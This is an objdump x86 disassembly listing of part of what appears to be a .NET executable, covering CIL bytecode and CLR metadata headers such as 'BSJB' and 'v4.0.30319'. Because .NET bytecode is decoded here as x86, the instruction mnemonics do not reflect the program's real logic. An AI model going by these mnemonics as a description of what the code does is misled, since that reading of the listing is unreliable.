  402b73:	00 30                	add    %dh,(%eax)
  402b75:	01 00                	add    %eax,(%eax)
  402b77:	00 31                	add    %dh,(%ecx)
  402b79:	01 00                	add    %eax,(%eax)
  402b7b:	00 05 00 00 00 02    	add    %al,0x2000000
  402b81:	00 00                	add    %al,(%eax)
  402b83:	01 1b                	add    %ebx,(%ebx)
  402b85:	30 03                	xor    %al,(%ebx)
  402b87:	00 a0 00 00 00 03    	add    %ah,0x3000000(%eax)
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	11 00                	adc    %eax,(%eax)
  402b91:	00 1f                	add    %bl,(%edi)
  402b93:	2b 28                	sub    (%eax),%ebp
  402b95:	1b 00                	sbb    (%eax),%eax
  402b97:	00 0a                	add    %cl,(%edx)
  402b99:	0a 06                	or     (%esi),%al
  402b9b:	72 73                	jb     0x402c10
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	70 28                	jo     0x402bc9
  402ba1:	21 00                	and    %eax,(%eax)
  402ba3:	00 0a                	add    %cl,(%edx)
  402ba5:	72 eb                	jb     0x402b92
  402ba7:	1a 00                	sbb    (%eax),%al
  402ba9:	70 17                	jo     0x402bc2
  402bab:	28 2e                	sub    %ch,(%esi)
  402bad:	00 00                	add    %al,(%eax)
  402baf:	0a 0b                	or     (%ebx),%cl
  402bb1:	03 72 73             	add    0x73(%edx),%esi
  402bb4:	00 00                	add    %al,(%eax)
  402bb6:	70 28                	jo     0x402be0
  402bb8:	21 00                	and    %eax,(%eax)
  402bba:	00 0a                	add    %cl,(%edx)
  402bbc:	72 eb                	jb     0x402ba9
  402bbe:	1a 00                	sbb    (%eax),%al
  402bc0:	70 17                	jo     0x402bd9
  402bc2:	28 2e                	sub    %ch,(%esi)
  402bc4:	00 00                	add    %al,(%eax)
  402bc6:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402bc9:	0d 2b 1f 00 00       	or     $0x1f2b,%eax
  402bce:	07                   	pop    %es
  402bcf:	09 9a 02 7b 01 00    	or     %ebx,0x17b02(%edx)
  402bd5:	00 04 28             	add    %al,(%eax,%ebp,1)
  402bd8:	2f                   	das
  402bd9:	00 00                	add    %al,(%eax)
  402bdb:	0a 00                	or     (%eax),%al
  402bdd:	00 de                	add    %bl,%dh
  402bdf:	05 26 00 00 de       	add    $0xde000026,%eax
  402be4:	00 00                	add    %al,(%eax)
  402be6:	00 09                	add    %cl,(%ecx)
  402be8:	17                   	pop    %ss
  402be9:	d6                   	salc
  402bea:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  402bef:	fe 04 13             	incb   (%ebx,%edx,1)
  402bf2:	04 11                	add    $0x11,%al
  402bf4:	04 2d                	add    $0x2d,%al
  402bf6:	d5 16                	aad    $0x16
  402bf8:	0d 2b 1f 00 00       	or     $0x1f2b,%eax
  402bfd:	08 09                	or     %cl,(%ecx)
  402bff:	9a 02 7b 01 00 00 04 	lcall  $0x400,$0x17b02
  402c06:	28 2f                	sub    %ch,(%edi)
  402c08:	00 00                	add    %al,(%eax)
  402c0a:	0a 00                	or     (%eax),%al
  402c0c:	00 de                	add    %bl,%dh
  402c0e:	05 26 00 00 de       	add    $0xde000026,%eax
  402c13:	00 00                	add    %al,(%eax)
  402c15:	00 09                	add    %cl,(%ecx)
  402c17:	17                   	pop    %ss
  402c18:	d6                   	salc
  402c19:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402c1e:	fe 04 13             	incb   (%ebx,%edx,1)
  402c21:	04 11                	add    $0x11,%al
  402c23:	04 2d                	add    $0x2d,%al
  402c25:	d5 00                	aad    $0x0
  402c27:	de 05 26 00 00 de    	fiadds 0xde000026
  402c2d:	00 00                	add    %al,(%eax)
  402c2f:	2a 01                	sub    (%ecx),%al
  402c31:	28 00                	sub    %al,(%eax)
  402c33:	00 00                	add    %al,(%eax)
  402c35:	00 3d 00 13 50 00    	add    %bh,0x501300
  402c3b:	05 02 00 00 01       	add    $0x1000002,%eax
  402c40:	00 00                	add    %al,(%eax)
  402c42:	6c                   	insb   (%dx),%es:(%edi)
  402c43:	00 13                	add    %dl,(%ebx)
  402c45:	7f 00                	jg     0x402c47
  402c47:	05 02 00 00 01       	add    $0x1000002,%eax
  402c4c:	00 00                	add    %al,(%eax)
  402c4e:	01 00                	add    %eax,(%eax)
  402c50:	98                   	cwtl
  402c51:	99                   	cltd
  402c52:	00 05 02 00 00 01    	add    %al,0x1000002
  402c58:	0b 30                	or     (%eax),%esi
  402c5a:	02 00                	add    (%eax),%al
  402c5c:	18 00                	sbb    %al,(%eax)
	...
  402c66:	28 10                	sub    %dl,(%eax)
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	0a 03                	or     (%ebx),%al
  402c6c:	28 30                	sub    %dh,(%eax)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	0a 00                	or     (%eax),%al
  402c72:	00 de                	add    %bl,%dh
  402c74:	05 26 00 00 de       	add    $0xde000026,%eax
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	2a 01                	sub    (%ecx),%al
  402c7d:	10 00                	adc    %al,(%eax)
  402c7f:	00 00                	add    %al,(%eax)
  402c81:	00 01                	add    %al,(%ecx)
  402c83:	00 10                	add    %dl,(%eax)
  402c85:	11 00                	adc    %eax,(%eax)
  402c87:	05 02 00 00 01       	add    $0x1000002,%eax
  402c8c:	13 30                	adc    (%eax),%esi
  402c8e:	04 00                	add    $0x0,%al
  402c90:	43                   	inc    %ebx
  402c91:	00 00                	add    %al,(%eax)
  402c93:	00 04 00             	add    %al,(%eax,%eax,1)
  402c96:	00 11                	add    %dl,(%ecx)
  402c98:	00 73 31             	add    %dh,0x31(%ebx)
  402c9b:	00 00                	add    %al,(%eax)
  402c9d:	0a 0a                	or     (%edx),%cl
  402c9f:	06                   	push   %es
  402ca0:	73 32                	jae    0x402cd4
  402ca2:	00 00                	add    %al,(%eax)
  402ca4:	0a 0b                	or     (%ebx),%cl
  402ca6:	07                   	pop    %es
  402ca7:	72 1b                	jb     0x402cc4
  402ca9:	1b 00                	sbb    (%eax),%eax
  402cab:	70 6f                	jo     0x402d1c
  402cad:	33 00                	xor    (%eax),%eax
  402caf:	00 0a                	add    %cl,(%edx)
  402cb1:	00 07                	add    %al,(%edi)
  402cb3:	72 2b                	jb     0x402ce0
  402cb5:	1b 00                	sbb    (%eax),%eax
  402cb7:	70 02                	jo     0x402cbb
  402cb9:	28 21                	sub    %ah,(%ecx)
  402cbb:	00 00                	add    %al,(%eax)
  402cbd:	0a 6f 34             	or     0x34(%edi),%ch
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	0a 00                	or     (%eax),%al
  402cc4:	07                   	pop    %es
  402cc5:	17                   	pop    %ss
  402cc6:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc7:	35 00 00 0a 00       	xor    $0xa0000,%eax
  402ccc:	07                   	pop    %es
  402ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  402cce:	36 00 00             	add    %al,%ss:(%eax)
  402cd1:	0a 00                	or     (%eax),%al
  402cd3:	06                   	push   %es
  402cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd5:	37                   	aaa
  402cd6:	00 00                	add    %al,(%eax)
  402cd8:	0a 26                	or     (%esi),%ah
  402cda:	2a 00                	sub    (%eax),%al
  402cdc:	1b 30                	sbb    (%eax),%esi
  402cde:	03 00                	add    (%eax),%eax
  402ce0:	37                   	aaa
  402ce1:	00 00                	add    %al,(%eax)
  402ce3:	00 04 00             	add    %al,(%eax,%eax,1)
  402ce6:	00 11                	add    %dl,(%ecx)
  402ce8:	00 00                	add    %al,(%eax)
  402cea:	73 31                	jae    0x402d1d
  402cec:	00 00                	add    %al,(%eax)
  402cee:	0a 0a                	or     (%edx),%cl
  402cf0:	06                   	push   %es
  402cf1:	73 32                	jae    0x402d25
  402cf3:	00 00                	add    %al,(%eax)
  402cf5:	0a 0b                	or     (%ebx),%cl
  402cf7:	07                   	pop    %es
  402cf8:	03 6f 33             	add    0x33(%edi),%ebp
  402cfb:	00 00                	add    %al,(%eax)
  402cfd:	0a 00                	or     (%eax),%al
  402cff:	07                   	pop    %es
  402d00:	17                   	pop    %ss
  402d01:	6f                   	outsl  %ds:(%esi),(%dx)
  402d02:	35 00 00 0a 00       	xor    $0xa0000,%eax
  402d07:	07                   	pop    %es
  402d08:	6f                   	outsl  %ds:(%esi),(%dx)
  402d09:	36 00 00             	add    %al,%ss:(%eax)
  402d0c:	0a 00                	or     (%eax),%al
  402d0e:	06                   	push   %es
  402d0f:	6f                   	outsl  %ds:(%esi),(%dx)
  402d10:	37                   	aaa
  402d11:	00 00                	add    %al,(%eax)
  402d13:	0a 26                	or     (%esi),%ah
  402d15:	00 de                	add    %bl,%dh
  402d17:	05 26 00 00 de       	add    $0xde000026,%eax
  402d1c:	00 00                	add    %al,(%eax)
  402d1e:	2a 00                	sub    (%eax),%al
  402d20:	01 10                	add    %edx,(%eax)
  402d22:	00 00                	add    %al,(%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	01 00                	add    %eax,(%eax)
  402d28:	2f                   	das
  402d29:	30 00                	xor    %al,(%eax)
  402d2b:	05 02 00 00 01       	add    $0x1000002,%eax
  402d30:	1b 30                	sbb    (%eax),%esi
  402d32:	03 00                	add    (%eax),%eax
  402d34:	25 00 00 00 05       	and    $0x5000000,%eax
  402d39:	00 00                	add    %al,(%eax)
  402d3b:	11 00                	adc    %eax,(%eax)
  402d3d:	00 72 33             	add    %dh,0x33(%edx)
  402d40:	1b 00                	sbb    (%eax),%eax
  402d42:	70 03                	jo     0x402d47
  402d44:	72 43                	jb     0x402d89
  402d46:	1b 00                	sbb    (%eax),%eax
  402d48:	70 28                	jo     0x402d72
  402d4a:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  402d4f:	02 06                	add    (%esi),%al
  402d51:	28 07                	sub    %al,(%edi)
  402d53:	00 00                	add    %al,(%eax)
  402d55:	06                   	push   %es
  402d56:	00 00                	add    %al,(%eax)
  402d58:	de 05 26 00 00 de    	fiadds 0xde000026
  402d5e:	00 00                	add    %al,(%eax)
  402d60:	2a 00                	sub    (%eax),%al
  402d62:	00 00                	add    %al,(%eax)
  402d64:	01 10                	add    %edx,(%eax)
  402d66:	00 00                	add    %al,(%eax)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	01 00                	add    %eax,(%eax)
  402d6c:	1d 1e 00 05 02       	sbb    $0x205001e,%eax
  402d71:	00 00                	add    %al,(%eax)
  402d73:	01 0b                	add    %ecx,(%ebx)
  402d75:	30 04 00             	xor    %al,(%eax,%eax,1)
  402d78:	23 00                	and    (%eax),%eax
	...
  402d82:	02 72 69             	add    0x69(%edx),%dh
  402d85:	1b 00                	sbb    (%eax),%eax
  402d87:	70 03                	jo     0x402d8c
  402d89:	72 bf                	jb     0x402d4a
  402d8b:	1b 00                	sbb    (%eax),%eax
  402d8d:	70 28                	jo     0x402db7
  402d8f:	15 00 00 0a 28       	adc    $0x280a0000,%eax
  402d94:	07                   	pop    %es
  402d95:	00 00                	add    %al,(%eax)
  402d97:	06                   	push   %es
  402d98:	00 00                	add    %al,(%eax)
  402d9a:	de 05 26 00 00 de    	fiadds 0xde000026
  402da0:	00 00                	add    %al,(%eax)
  402da2:	2a 00                	sub    (%eax),%al
  402da4:	01 10                	add    %edx,(%eax)
  402da6:	00 00                	add    %al,(%eax)
  402da8:	00 00                	add    %al,(%eax)
  402daa:	01 00                	add    %eax,(%eax)
  402dac:	1b 1c 00             	sbb    (%eax,%eax,1),%ebx
  402daf:	05 02 00 00 01       	add    $0x1000002,%eax
  402db4:	13 30                	adc    (%eax),%esi
  402db6:	02 00                	add    (%eax),%al
  402db8:	2f                   	das
  402db9:	00 00                	add    %al,(%eax)
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	00 00                	add    %al,(%eax)
  402dbf:	11 00                	adc    %eax,(%eax)
  402dc1:	03 16                	add    (%esi),%edx
  402dc3:	fe 01                	incb   (%ecx)
  402dc5:	0a 06                	or     (%esi),%al
  402dc7:	2d 1d 00 02 7b       	sub    $0x7b02001d,%eax
  402dcc:	02 00                	add    (%eax),%al
  402dce:	00 04 14             	add    %al,(%esp,%edx,1)
  402dd1:	fe 01                	incb   (%ecx)
  402dd3:	0a 06                	or     (%esi),%al
  402dd5:	2d 0e 00 02 7b       	sub    $0x7b02000e,%eax
  402dda:	02 00                	add    (%eax),%al
  402ddc:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402ddf:	17                   	pop    %ss
  402de0:	00 00                	add    %al,(%eax)
  402de2:	0a 00                	or     (%eax),%al
  402de4:	00 00                	add    %al,(%eax)
  402de6:	02 03                	add    (%ebx),%al
  402de8:	28 38                	sub    %bh,(%eax)
  402dea:	00 00                	add    %al,(%eax)
  402dec:	0a 00                	or     (%eax),%al
  402dee:	2a 8a 00 02 17 28    	sub    0x28170200(%edx),%cl
  402df4:	39 00                	cmp    %eax,(%eax)
  402df6:	00 0a                	add    %cl,(%edx)
  402df8:	00 02                	add    %al,(%edx)
  402dfa:	72 c9                	jb     0x402dc5
  402dfc:	1b 00                	sbb    (%eax),%eax
  402dfe:	70 6f                	jo     0x402e6f
  402e00:	3a 00                	cmp    (%eax),%al
  402e02:	00 0a                	add    %cl,(%edx)
  402e04:	00 02                	add    %al,(%edx)
  402e06:	72 f9                	jb     0x402e01
  402e08:	1b 00                	sbb    (%eax),%eax
  402e0a:	70 28                	jo     0x402e34
  402e0c:	3b 00                	cmp    (%eax),%eax
  402e0e:	00 0a                	add    %cl,(%edx)
  402e10:	00 2a                	add    %ch,(%edx)
  402e12:	6a 00                	push   $0x0
  402e14:	28 3d 00 00 0a 00    	sub    %bh,0xa0000
  402e1a:	16                   	push   %ss
  402e1b:	28 3e                	sub    %bh,(%esi)
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	0a 00                	or     (%eax),%al
  402e21:	73 02                	jae    0x402e25
  402e23:	00 00                	add    %al,(%eax)
  402e25:	06                   	push   %es
  402e26:	28 3f                	sub    %bh,(%edi)
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	0a 00                	or     (%eax),%al
  402e2c:	2a 1e                	sub    (%esi),%bl
  402e2e:	02 28                	add    (%eax),%ch
  402e30:	40                   	inc    %eax
  402e31:	00 00                	add    %al,(%eax)
  402e33:	0a 2a                	or     (%edx),%ch
  402e35:	00 00                	add    %al,(%eax)
  402e37:	00 42 53             	add    %al,0x53(%edx)
  402e3a:	4a                   	dec    %edx
  402e3b:	42                   	inc    %edx
  402e3c:	01 00                	add    %eax,(%eax)
  402e3e:	01 00                	add    %eax,(%eax)
  402e40:	00 00                	add    %al,(%eax)
  402e42:	00 00                	add    %al,(%eax)
  402e44:	0c 00                	or     $0x0,%al
  402e46:	00 00                	add    %al,(%eax)
  402e48:	76 34                	jbe    0x402e7e
  402e4a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  402e4d:	33 30                	xor    (%eax),%esi
  402e4f:	33 31                	xor    (%ecx),%esi
  402e51:	39 00                	cmp    %eax,(%eax)
  402e53:	00 00                	add    %al,(%eax)
  402e55:	00 05 00 6c 00 00    	add    %al,0x6c00
  402e5b:	00 d0                	add    %dl,%al
  402e5d:	04 00                	add    $0x0,%al
  402e5f:	00 23                	add    %ah,(%ebx)
  402e61:	7e 00                	jle    0x402e63
  402e63:	00 3c 05 00 00 1c 07 	add    %bh,0x71c0000(,%eax,1)
  402e6a:	00 00                	add    %al,(%eax)
  402e6c:	23 53 74             	and    0x74(%ebx),%edx
  402e6f:	72 69                	jb     0x402eda
  402e71:	6e                   	outsb  %ds:(%esi),(%dx)
  402e72:	67 73 00             	addr16 jae 0x402e75
  402e75:	00 00                	add    %al,(%eax)
  402e77:	00 58 0c             	add    %bl,0xc(%eax)
  402e7a:	00 00                	add    %al,(%eax)
  402e7c:	0c 1c                	or     $0x1c,%al
  402e7e:	00 00                	add    %al,(%eax)
  402e80:	23 55 53             	and    0x53(%ebp),%edx
  402e83:	00 64 28 00          	add    %ah,0x0(%eax,%ebp,1)
  402e87:	00 10                	add    %dl,(%eax)
  402e89:	00 00                	add    %al,(%eax)
  402e8b:	00 23                	add    %ah,(%ebx)
  402e8d:	47                   	inc    %edi
  402e8e:	55                   	push   %ebp
  402e8f:	49                   	dec    %ecx
  402e90:	44                   	inc    %esp
  402e91:	00 00                	add    %al,(%eax)
  402e93:	00 74 28 00          	add    %dh,0x0(%eax,%ebp,1)
  402e97:	00 20                	add    %ah,(%eax)
  402e99:	02 00                	add    (%eax),%al
  402e9b:	00 23                	add    %ah,(%ebx)
  402e9d:	42                   	inc    %edx
  402e9e:	6c                   	insb   (%dx),%es:(%edi)
  402e9f:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea0:	62 00                	bound  %eax,(%eax)
  402ea2:	00 00                	add    %al,(%eax)
  402ea4:	00 00                	add    %al,(%eax)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	02 00                	add    (%eax),%al
  402eaa:	00 01                	add    %al,(%ecx)
  402eac:	57                   	push   %edi
  402ead:	15 02 14 09 00       	adc    $0x91402,%eax
  402eb2:	00 00                	add    %al,(%eax)
  402eb4:	00 fa                	add    %bh,%dl
  402eb6:	25 33 00 16 00       	and    $0x160033,%eax
  402ebb:	00 01                	add    %al,(%ecx)
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 2d 00 00 00 03    	add    %ch,0x3000000
  402ec5:	00 00                	add    %al,(%eax)
  402ec7:	00 02                	add    %al,(%edx)
  402ec9:	00 00                	add    %al,(%eax)
  402ecb:	00 0d 00 00 00 0c    	add    %cl,0xc000000
  402ed1:	00 00                	add    %al,(%eax)
  402ed3:	00 40 00             	add    %al,0x0(%eax)
  402ed6:	00 00                	add    %al,(%eax)
  402ed8:	0d 00 00 00 06       	or     $0x6000000,%eax
  402edd:	00 00                	add    %al,(%eax)
  402edf:	00 01                	add    %al,(%ecx)
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	00 01                	add    %al,(%ecx)
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	00 01                	add    %al,(%ecx)
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	00 03                	add    %al,(%ebx)
  402eed:	00 00                	add    %al,(%eax)
  402eef:	00 00                	add    %al,(%eax)
  402ef1:	00 0a                	add    %cl,(%edx)
  402ef3:	00 01                	add    %al,(%ecx)
  402ef5:	00 00                	add    %al,(%eax)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	00 06                	add    %al,(%esi)
  402efb:	00 63 00             	add    %ah,0x0(%ebx)
  402efe:	4e                   	dec    %esi
  402eff:	00 0a                	add    %cl,(%edx)
  402f01:	00 78 00             	add    %bh,0x0(%eax)
  402f04:	71 00                	jno    0x402f06
  402f06:	0e                   	push   %cs
  402f07:	00 04 01             	add    %al,(%ecx,%eax,1)
  402f0a:	ee                   	out    %al,(%dx)
  402f0b:	00 0a                	add    %cl,(%edx)
  402f0d:	00 b4 01 9a 01 0a 00 	add    %dh,0xa019a(%ecx,%eax,1)
  402f14:	df 01                	filds  (%ecx)
  402f16:	cd 01                	int    $0x1
  402f18:	0a 00                	or     (%eax),%al
  402f1a:	f6 01 cd             	testb  $0xcd,(%ecx)
  402f1d:	01 0a                	add    %ecx,(%edx)
  402f1f:	00 13                	add    %dl,(%ebx)
  402f21:	02 cd                	add    %ch,%cl
  402f23:	01 0a                	add    %ecx,(%edx)
  402f25:	00 32                	add    %dh,(%edx)
  402f27:	02 cd                	add    %ch,%cl
  402f29:	01 0a                	add    %ecx,(%edx)
  402f2b:	00 4b 02             	add    %cl,0x2(%ebx)
  402f2e:	cd 01                	int    $0x1
  402f30:	0a 00                	or     (%eax),%al
  402f32:	64 02 cd             	fs add %ch,%cl
  402f35:	01 0a                	add    %ecx,(%edx)
  402f37:	00 7f 02             	add    %bh,0x2(%edi)
  402f3a:	cd 01                	int    $0x1
  402f3c:	0a 00                	or     (%eax),%al
  402f3e:	9a 02 cd 01 0a 00 d2 	lcall  $0xd200,$0xa01cd02
  402f45:	02 b3 02 0a 00 e6    	add    -0x19fff5fe(%ebx),%dh
  402f4b:	02 cd                	add    %ch,%cl
  402f4d:	01 0a                	add    %ecx,(%edx)
  402f4f:	00 12                	add    %dl,(%edx)
  402f51:	03 ff                	add    %edi,%edi
  402f53:	02 3f                	add    (%edi),%bh
  402f55:	00 26                	add    %ah,(%esi)
  402f57:	03 00                	add    (%eax),%eax
  402f59:	00 0a                	add    %cl,(%edx)
  402f5b:	00 55 03             	add    %dl,0x3(%ebp)
  402f5e:	35 03 0a 00 75       	xor    $0x75000a03,%eax
  402f63:	03 35 03 0a 00 aa    	add    0xaa000a03,%esi
  402f69:	03 b3 02 06 00 c7    	add    -0x38fff9fe(%ebx),%esi
  402f6f:	03 4e 00             	add    0x0(%esi),%ecx
  402f72:	0a 00                	or     (%eax),%al
  402f74:	f0 03 e6             	lock add %esi,%esp
  402f77:	03 0a                	add    (%edx),%ecx
  402f79:	00 12                	add    %dl,(%edx)
  402f7b:	04 02                	add    $0x2,%al
  402f7d:	04 0a                	add    $0xa,%al
  402f7f:	00 1b                	add    %bl,(%ebx)
  402f81:	04 02                	add    $0x2,%al
  402f83:	04 0a                	add    $0xa,%al
  402f85:	00 3e                	add    %bh,(%esi)
  402f87:	04 71                	add    $0x71,%al
  402f89:	00 0a                	add    %cl,(%edx)
  402f8b:	00 55 04             	add    %dl,0x4(%ebp)
  402f8e:	71 00                	jno    0x402f90
  402f90:	0a 00                	or     (%eax),%al
  402f92:	7b 04                	jnp    0x402f98
  402f94:	02 04 0a             	add    (%edx,%ecx,1),%al
  402f97:	00 8d 04 71 00 6f    	add    %cl,0x6f007104(%ebp)
  402f9d:	00 99 04 00 00 0a    	add    %bl,0xa000004(%ecx)
  402fa3:	00 c2                	add    %al,%dl
  402fa5:	04 e6                	add    $0xe6,%al
  402fa7:	03 0a                	add    (%edx),%ecx
  402fa9:	00 fb                	add    %bh,%bl
  402fab:	04 e6                	add    $0xe6,%al
  402fad:	03 0e                	add    (%esi),%ecx
  402faf:	00 20                	add    %ah,(%eax)
  402fb1:	05 15 05 0e 00       	add    $0xe0515,%eax
  402fb6:	2a 05 15 05 0e 00    	sub    0xe0515,%al
  402fbc:	69 05 4a 05 0a 00 8e 	imul   $0x3e6058e,0xa054a,%eax
  402fc3:	05 e6 03 
  402fc6:	06                   	push   %es
  402fc7:	00 ab 05 4e 00 0e    	add    %ch,0xe004e05(%ebx)
  402fcd:	00 b8 05 ff 02 06    	add    %bh,0x602ff05(%eax)
  402fd3:	00 cf                	add    %cl,%bh
  402fd5:	05 4e 00 0a 00       	add    $0xa004e,%eax
  402fda:	e0 05                	loopne 0x402fe1
  402fdc:	71 00                	jno    0x402fde
  402fde:	06                   	push   %es
  402fdf:	00 f7                	add    %dh,%bh
  402fe1:	05 4e 00 0a 00       	add    $0xa004e,%eax
  402fe6:	09 06                	or     %eax,(%esi)
  402fe8:	e6 03                	out    %al,$0x3
  402fea:	0e                   	push   %cs
  402feb:	00 29                	add    %ch,(%ecx)
  402fed:	06                   	push   %es
  402fee:	ff 02                	incl   (%edx)
  402ff0:	0e                   	push   %cs
  402ff1:	00 55 06             	add    %dl,0x6(%ebp)
  402ff4:	ff 02                	incl   (%edx)
  402ff6:	06                   	push   %es
  402ff7:	00 8c 06 4e 00 06 00 	add    %cl,0x6004e(%esi,%eax,1)
  402ffe:	9d                   	popf
  402fff:	06                   	push   %es
  403000:	4e                   	dec    %esi
  403001:	00 0a                	add    %cl,(%edx)
  403003:	00 cf                	add    %cl,%bh
  403005:	06                   	push   %es
  403006:	71 00                	jno    0x403008
  403008:	00 00                	add    %al,(%eax)
  40300a:	00 00                	add    %al,(%eax)
  40300c:	01 00                	add    %eax,(%eax)
  40300e:	00 00                	add    %al,(%eax)
  403010:	00 00                	add    %al,(%eax)
  403012:	01 00                	add    %eax,(%eax)
  403014:	01 00                	add    %eax,(%eax)
  403016:	01 00                	add    %eax,(%eax)
  403018:	10 00                	adc    %al,(%eax)
  40301a:	25 00 2e 00 05       	and    $0x5002e00,%eax
  40301f:	00 01                	add    %al,(%ecx)
  403021:	00 01                	add    %al,(%ecx)
  403023:	00 00                	add    %al,(%eax)
  403025:	01 10                	add    %edx,(%eax)
  403027:	00 46 00             	add    %al,0x0(%esi)
  40302a:	2e 00 09             	add    %cl,%cs:(%ecx)
  40302d:	00 03                	add    %al,(%ebx)
  40302f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403032:	06                   	push   %es
  403033:	00 7f 00             	add    %bh,0x0(%edi)
  403036:	0a 00                	or     (%eax),%al
  403038:	01 00                	add    %eax,(%eax)
  40303a:	0f 01 23             	smsw   (%ebx)
  40303d:	00 00                	add    %al,(%eax)
  40303f:	00 00                	add    %al,(%eax)
  403041:	00 80 00 91 20 86    	add    %al,-0x79df6f00(%eax)
  403047:	00 0e                	add    %cl,(%esi)
  403049:	00 01                	add    %al,(%ecx)
  40304b:	00 50 20             	add    %dl,0x20(%eax)
  40304e:	00 00                	add    %al,(%eax)
  403050:	00 00                	add    %al,(%eax)
  403052:	86 18                	xchg   %bl,(%eax)
  403054:	9e                   	sahf
  403055:	00 15 00 04 00 c4    	add    %dl,0xc4000400
  40305b:	29 00                	sub    %eax,(%eax)
  40305d:	00 00                	add    %al,(%eax)
  40305f:	00 86 00 a4 00 19    	add    %al,0x1900a400(%esi)
  403065:	00 04 00             	add    %al,(%eax,%eax,1)
  403068:	84 2b                	test   %ch,(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	00 00                	add    %al,(%eax)
  40306e:	86 00                	xchg   %al,(%eax)
  403070:	b5 00                	mov    $0x0,%ch
  403072:	19 00                	sbb    %eax,(%eax)
  403074:	05 00 58 2c 00       	add    $0x2c5800,%eax
  403079:	00 00                	add    %al,(%eax)
  40307b:	00 86 00 c0 00 19    	add    %al,0x1900c000(%esi)
  403081:	00 06                	add    %al,(%esi)
  403083:	00 8c 2c 00 00 00 00 	add    %cl,0x0(%esp,%ebp,1)
  40308a:	96                   	xchg   %eax,%esi
  40308b:	00 c9                	add    %cl,%cl
  40308d:	00 1e                	add    %bl,(%esi)
  40308f:	00 07                	add    %al,(%edi)
  403091:	00 dc                	add    %bl,%ah
  403093:	2c 00                	sub    $0x0,%al
  403095:	00 00                	add    %al,(%eax)
  403097:	00 86 00 d4 00 19    	add    %al,0x1900d400(%esi)
  40309d:	00 08                	add    %cl,(%eax)
  40309f:	00 30                	add    %dh,(%eax)
  4030a1:	2d 00 00 00 00       	sub    $0x0,%eax
  4030a6:	86 00                	xchg   %al,(%eax)
  4030a8:	da 00                	fiaddl (%eax)
  4030aa:	19 00                	sbb    %eax,(%eax)
  4030ac:	09 00                	or     %eax,(%eax)
  4030ae:	74 2d                	je     0x4030dd
  4030b0:	00 00                	add    %al,(%eax)
  4030b2:	00 00                	add    %al,(%eax)
  4030b4:	86 00                	xchg   %al,(%eax)
  4030b6:	e1 00                	loope  0x4030b8
  4030b8:	19 00                	sbb    %eax,(%eax)
  4030ba:	0a 00                	or     (%eax),%al
  4030bc:	b4 2d                	mov    $0x2d,%ah
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	00 00                	add    %al,(%eax)
  4030c2:	c4 00                	les    (%eax),%eax
  4030c4:	1a 01                	sbb    (%ecx),%al
  4030c6:	27                   	daa
  4030c7:	00 0b                	add    %cl,(%ebx)
  4030c9:	00 ef                	add    %ch,%bh
  4030cb:	2d 00 00 00 00       	sub    $0x0,%eax
  4030d0:	81 00 22 01 15 00    	addl   $0x150122,(%eax)
  4030d6:	0c 00                	or     $0x0,%al
  4030d8:	12 2e                	adc    (%esi),%ch
  4030da:	00 00                	add    %al,(%eax)
  4030dc:	00 00                	add    %al,(%eax)
  4030de:	91                   	xchg   %eax,%ecx
  4030df:	00 36                	add    %dh,(%esi)
  4030e1:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  4030e4:	0c 00                	or     $0x0,%al
  4030e6:	2d 2e 00 00 00       	sub    $0x2e,%eax
  4030eb:	00 86 18 9e 00 15    	add    %al,0x15009e18(%esi)
  4030f1:	00 0d 00 00 00 01    	add    %cl,0x1000000
  4030f7:	00 3b                	add    %bh,(%ebx)
  4030f9:	01 00                	add    %eax,(%eax)
  4030fb:	00 02                	add    %al,(%edx)
  4030fd:	00 3e                	add    %bh,(%esi)
  4030ff:	01 00                	add    %eax,(%eax)
  403101:	00 03                	add    %al,(%ebx)
  403103:	00 41 01             	add    %al,0x1(%ecx)
  403106:	00 00                	add    %al,(%eax)
  403108:	01 00                	add    %eax,(%eax)
  40310a:	44                   	inc    %esp
  40310b:	01 00                	add    %eax,(%eax)
  40310d:	00 01                	add    %al,(%ecx)
  40310f:	00 51 01             	add    %dl,0x1(%ecx)
  403112:	00 00                	add    %al,(%eax)
  403114:	01 00                	add    %eax,(%eax)
  403116:	5a                   	pop    %edx
  403117:	01 00                	add    %eax,(%eax)
  403119:	00 01                	add    %al,(%ecx)
  40311b:	00 5f 01             	add    %bl,0x1(%edi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	01 00                	add    %eax,(%eax)
  403122:	68 01 00 00 01       	push   $0x1000001
  403127:	00 71 01             	add    %dh,0x1(%ecx)
  40312a:	00 00                	add    %al,(%eax)
  40312c:	01 00                	add    %eax,(%eax)
  40312e:	83 01 00             	addl   $0x0,(%ecx)
  403131:	00 01                	add    %al,(%ecx)
  403133:	00 8b 01 00 00 01    	add    %cl,0x1000001(%ebx)
  403139:	00 95 01 21 00 9e    	add    %dl,-0x61ffdeff(%ebp)
  40313f:	00 19                	add    %bl,(%ecx)
  403141:	00 29                	add    %ch,(%ecx)
